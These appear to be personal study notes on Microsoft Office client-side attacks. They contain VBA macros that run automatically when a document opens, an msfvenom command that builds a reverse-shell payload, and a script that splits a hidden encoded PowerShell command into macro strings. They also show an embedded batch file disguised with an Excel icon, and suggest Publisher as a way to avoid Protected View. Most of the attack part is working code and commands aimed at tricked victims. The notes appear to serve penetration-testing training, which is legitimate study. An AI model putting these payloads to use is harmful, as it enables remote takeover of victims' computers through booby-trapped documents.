### Macros
  
Series of commands and instructions that are grouped together to accomplish a task programmatically.  
- Often used to manage dynamic content and link docs w/ external content.  
- Can be written from scratch in Visual Basic for Applications (VBA)  
	- Fully functional scripting language w/ full access to ActiveX objects & the Windows Script Host (similar to JS in HTML Apps)  
  
  
W/in MS Word (likely similar in Excel)  
- Choose VIEW ribbon > Select Macros  
- Type name for macro > Create  
- Doc must be saved as either **.docm** or **.doc** formats.  
	- \*\**Avoid **.docx** format as it doesn't support macros  
  
  
Body of the macro is denoted by keywords _**Sub**_ and _**End Sub**_  
	- Sub procedures are very similar to a Function in VBA  
		- Difference is Sub procedures can't be used in expressions as they don't return any values.  
- _**'**_ = Comments  

```vbscript
Sub AutoOpen()
  
	MyMacro
  
End Sub
  
Sub Document_Open()
  
	MyMacro
  
End Sub
  
Sub MyMacro()
  
	CreateObject("Wscript.Shell").Run "cmd"

End Sub
```
	- AutoOpen() = Executed when a new doc is opened  
	- Document_Open() = Executed when a previously opened doc is reopened  
  
  
Once Doc is saved & reopened, a security warning requests to Enable Content (& effectively run the macros within)  
-  IRL, if the victim doesn't click the _Enable Content_, the attack will fail. So they'll need to be sufficiently encouraged to do so.  
  
  
For another payload (reverse shell), we can execute Metasploit's PS shellcode using a Base64 string.  
  
As VBA has a 255-char limit for literal strings, we'll have to split the commands into multiple lines and concatenate them.  
  
  
New macro (diff Lines 14 & 16):  
```vbscript
Sub AutoOpen()  
  
	MyMacro  
  
End Sub  
  
Sub Document_Open()  
  
	MyMacro  
  
End Sub  
  
	Sub MyMacro()  
	Dim Str As String  
  
	CreateObject("Wscript.Shell").Run Str  
  
End Sub
```


**msfvenom** payload:  
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f hta-psh -o /var/www/html/evil.hta
```

  
Using a python script to split up the payload ^:  
```python
str = "powershell.exe -nop -w hidden -e <msfvenom shellcode>"  
  
n = 50  
  
for i in range(0, len(str), n):  
print "Str = Str + " + '"' + str[i:i+n] + '"'
```

 
Updated macro:  
```vbscript
Sub AutoOpen()  
  
	MyMacro  
  
End Sub  
  
Sub Document_Open()  
  
	MyMacro  
  
End Sub  
  
Sub MyMacro()  
	Dim Str As String  
  
	Str = "powershell.exe -nop -w hidden -e <encoded powershell reverse"  
	Str = Str + "shell generated from msfvenom........."  
	...  
	...  
	...  
	Str = Str + "QA=="  
  
	CreateObject("Wscript.Shell").Run "Str"  
  
End Sub
```

  

### Object Linking and Embedding

**OLE** allows for abusing MS Office's document-embedding feature.  
  
**DDE** - Dynamic Data Exhange  
- Allows for the ability to execute arbitrary apps from within Office docs.  
*Patched since Dec 2017  
  
_.bat_ files are an older (still fully functional) format - replaced by VB & PS   
  
First we create the batch script:  
	POC will be to launch a cmd prompt:  
```bash
echo START cmd.exe > launch.bat
```

  
Then insert into a doc:  
- Open Word > Create new doc  
- Insert ribbon > Click on object menu
![[doc-object.png]]

- Create from file > Choose script  
	- Check Display as icon  
	- Change icon...  
		- Navigate to a desired binary  
			- Ex: C\:\\Program Files\\Microsoft Office\\root\\Office 16\\EXCEL  
		- Rename icon
![[doc-fromfile.png]]
	- Batch file is then embedded in the Word doc  
	- Save doc  
  
Once the icon is double clicked & the security warning is accepted, the batch file is launched.   
  
For the real exploit, replace the **cmd.exe** with the **msfvenom** payload ^^  
```powershell
START powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBd......
```

Once the batch file is update, you'll need to re-embed it in the doc.  
  

### Evading Protected View:

Protected View - When served from the internet, this protection disables all editng & mods in the doc and blocks the execution of macros or embedded objects.  
  
To simulate:  
- Use **nc** to transfer the file from Win Client to kali  
- Host it on Apache server (or python, whatever)  
- Download doc from the server onto our victim machine  
	- At this point, Protected View is engaged & we can't execute the batch file

![[protected_view.png]]

It's unlikely that a victim will click on Enable Editing and leave Protected View  
  
To get around, MS Publisher will not only allow for embedded objects, but will also not employ Protected View for internet delivered documents  
Issue, however, is that Publisher is less frequently installed compared to Word or Excel
